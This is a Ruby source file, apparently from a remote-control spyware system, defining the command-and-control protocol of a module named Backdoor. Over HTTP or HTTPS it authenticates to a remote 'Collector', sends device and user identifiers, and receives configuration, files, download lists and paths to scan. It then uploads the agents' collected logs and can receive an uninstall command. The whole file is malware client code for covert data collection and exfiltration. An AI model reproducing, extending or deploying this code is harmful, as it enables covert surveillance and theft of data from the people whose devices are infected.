#
# Implementation of the communication protocol
#

# Relatives
require_relative 'transport.rb'
require_relative 'command.rb'

# RCS::Common
require 'rcs-common/trace'

# System
require 'ostruct'

module RCS
module Backdoor
  
class Protocol
  include Tracer
  include Command 
  
  # used by the Command module
  attr_reader :transport
  attr_accessor :sync
  
  def initialize(type, sync)
    case type
      when :REST
        trace :debug, "REST Protocol selected"
        @transport = Transport.new(:HTTP)
      when :RESTS
        trace :debug, "REST SSL Protocol selected"
        @transport = Transport.new(:HTTPS)
      when :ASP, :RSSM
        trace :warn, "#{type} Protocol selected..."
        raise "You must be kidding... :)"
      else
        raise "Unsupported Protocol"
    end  
    @sync = sync
  end
  
  def perform(host)

    begin
      # connection to the remote host
      @transport.connect_to host
      
      # Mixed-in functions
      
      # authenticate with the Collector
      # this step will produce the cryptographic session key
      # we can also receive an uninstall command
      authenticate @sync.backdoor
      
      # send the deviceID, userID, sourceID
      # we will receive the list of available element on the collector 
      available = send_id @sync.backdoor
      
      # receive the new configuration
      receive_config @sync.backdoor if available.include? PROTO_CONF
      
      # receive the files in the upload queue
      receive_uploads if available.include? PROTO_UPLOAD
      
      # receive the list of files to be downloaded
      receive_downloads if available.include? PROTO_DOWNLOAD
      
      # receive the list of paths to be scanned
      receive_filesystems if available.include? PROTO_FILESYSTEM
      
      # send the agents' logs
      send_logs @sync.backdoor.logs unless @sync.backdoor.logs.empty?
      
      # terminate the protocol
      bye
      
      # clean up
      @transport.disconnect
      
    rescue Exception => detail
      trace :fatal, "ERROR: " << detail.to_s
      raise
    end
    
  end

end

end # Backdoor::
end # RCS::
